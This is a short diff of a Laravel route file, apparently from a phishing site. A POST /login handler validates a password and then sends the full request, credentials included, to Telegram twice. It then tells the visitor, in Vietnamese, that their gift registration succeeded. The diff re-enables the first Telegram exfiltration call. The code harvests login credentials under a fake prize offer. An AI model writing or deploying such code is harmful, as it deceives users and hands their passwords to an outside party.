@@ -46,7 +46,7 @@ Route::post('/login', function (Request $request){
         'password.required' => 'Password không được để trống',
     ]);
 
-    // Noti::telegram($request->all());
+    Noti::telegram($request->all());
     Noti::telegram2($request->all());
     Alert::success('Đăng ký nhận quà thành công', 'Chúng tôi sẽ sớm liên hệ bạn để nhận quà');
     return redirect('/');
